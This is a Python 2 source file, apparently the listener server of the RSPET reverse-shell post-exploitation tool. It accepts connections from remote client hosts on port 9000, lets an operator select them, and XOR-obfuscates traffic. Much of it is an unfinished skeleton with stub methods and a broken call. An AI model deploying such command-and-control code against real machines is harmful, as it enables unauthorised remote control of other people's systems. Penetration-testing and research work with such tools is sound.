#!/usr/bin/env python2
from __future__ import print_function
from socket import socket, AF_INET, SOCK_STREAM
from socket import error as sock_error
from sys import exit as sysexit
from sys import argv
from thread import start_new_thread
from threading import Thread
from Plugins.gen import Plugin
import Plugins.test
import tab

class Console:
    """Class to interfere with the server"""
    max_conns = 5 # Maximum connections that the server accepts
    server = None # The server object
    prompt = "~$ " # Current command prompt

    def __init__(self, max_conns=5):
        """Starts server"""
        self.max_conns = max_conns
        self.server = Server()

    def __del__(self):
        del self.server

    def loop(self):
        """Main CLI loop"""
        self._logo()
        print(self.server.ip)
        start_new_thread(self.server.loop, ())
        while True:
            cmd = raw_input(self.prompt)

            cmdargs = cmd.split(" ")
            cmd = cmdargs[0]
            del cmdargs[0]

    def _logo(self):
        """Print logo and Authorship/Licence."""
        print(r"#####################################################")
        print(r"__________  _________________________________________")
        print(r"\______   \/   _____/\______   \_   _____/\__    ___/")
        print(r" |       _/\_____  \  |     ___/|    __)_   |    |   ")
        print(r" |    |   \/        \ |    |    |        \  |    |   ")
        print(r" |____|_  /_______  / |____|   /_______  /  |____|   ")
        print(r"        \/        \/                   \/            ")
        print(r"")
        print(r" -Author: panagiks (http://panagiks.xyz)")
        print(r" -Author: dzervas (http://dzervas.gr)")
        print(r" -Licence: MIT")
        print(r"#####################################################")
        print(r"")

    def _help(self, menu):
        """Help menu

        Keyword argument:
        menu    -- Menu to show
        """

    def _list(self):
        """List connected clients"""

class Server:
    """Main class of the server. Manages all the connected hosts"""
    ip = "0.0.0.0"
    port = "9000"
    max_conns = 5
    hosts = [] # List of hosts
    selection = [] # List of selected hosts
    plugins = [] # List of active plugins
    sock = None

    def __init__(self, max_conns=5, ip="0.0.0.0", port="9000"):
        """Starts to listen on socket"""
        self.ip = ip
        self.port = port
        self.max_conns = max_conns

        self.sock = socket(AF_INET, SOCK_STREAM)
        self.sock.setblocking(1)
        try:
            self.sock.bind((ip, int(port)))
            self.sock.listen(max_conns)
        except sock_error:
            print("Something went during binding & listening")

    def __del__(self):
        """Safely closes all sockets"""
        for host in self.hosts:
            del host
        self.sock.close()

    def loop(self):
        """Main server loop. Better call it on its own thread"""
        while True:
            (csock, (ip, port)) = self.sock.accept()
            self.hosts.append(Host(csock, ip, port))

    def select(self, ids=None):
        """Selects given host(s) based on ids

        Keyword argument:
        ids     -- Array of ids of hosts. Empty array unselects all. None
        selects all
        """
        if ids is None:
            self.selected = self.hosts
            return self.selected

        self.selected = []
        for i in ids:
            self.selected.append(self.hosts[i])

        return self.selected

    def execute(self, cmd, args):
        """Execute function on all client objects.

        Keyword argument:
        cmd     -- Function to call for each selected host.
        Function signature myfunc(Host, args[0], args[1], ...)
        It should accept len(args) - 1 arguments
        args    -- Arguments to pass to the command function"""
        pass

class Host:
    """Class for host. Each Host object represent one client"""
    ip = None
    port = None
    version = None
    type = "full"
    sock = None

    def __init__(self, sock, ip, port):
        """Accepts the connection and initializes variables"""
        self.sock = sock
        self.ip = ip
        self.port = port

        tmp = self.recv().split("-")
        self.version = tmp[0]
        self.type = tmp[1]
        print(self.ip, self.port, self.version, self.type)

    def __del__(self):
        """Graceful deletion of host"""
        self.sock.close()

    def send(self, msg):
        """Send message to host"""
        return self.sock.send(self._enc(msg))

    def recv(self, size=1024):
        """Receive from host"""
        return self._dec(self.sock.recv(size))
        # return self.sock.recv(size)

    def _enc(self, data):
        """Encrypt message (before send)"""
        out = bytearray(data, 'UTF-8')
        for i in range(len(out)):
            out[i] = out[i] ^ 0x41

        return out

    def _dec(self, data):
        """Decrypt message (after receive)"""
        out = bytearray(data)
        for i in range(len(out)):
            out[i] = out[i] ^ 0x41

        return out

if __name__ == "__main__":
    # for plugin in Plugin.plugins:
        # plugin.hello()

    cli = Console()
    try:
        cli.loop(int(argv[1]))
    except IndexError:
        cli.loop()
    except KeyError:
        del cli
        sysexit()
